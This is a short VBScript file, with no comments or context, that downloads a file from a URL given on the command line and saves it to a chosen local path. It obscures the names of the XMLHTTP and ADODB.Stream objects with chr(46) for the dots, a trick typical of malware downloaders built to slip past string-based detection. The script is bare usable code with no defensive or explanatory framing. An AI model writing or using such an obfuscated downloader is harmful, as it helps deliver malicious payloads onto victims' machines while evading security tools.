lid = LCase(WScript.Arguments(1))  
wid = LCase(WScript.Arguments(0))  
Set wdv = CreateObject("Microsoft" & chr(46) & "XMLHTTP")  
wdv.Open "GET",wid,0  
wdv.Send()  
Set sGet = CreateObject("ADODB" & chr(46) & "Stream")  
sGet.Type = 1 
sGet.Mode = 3  
sGet.Open()  
sGet.Write(wdv.responseBody)  
sGet.SaveToFile lid,2  
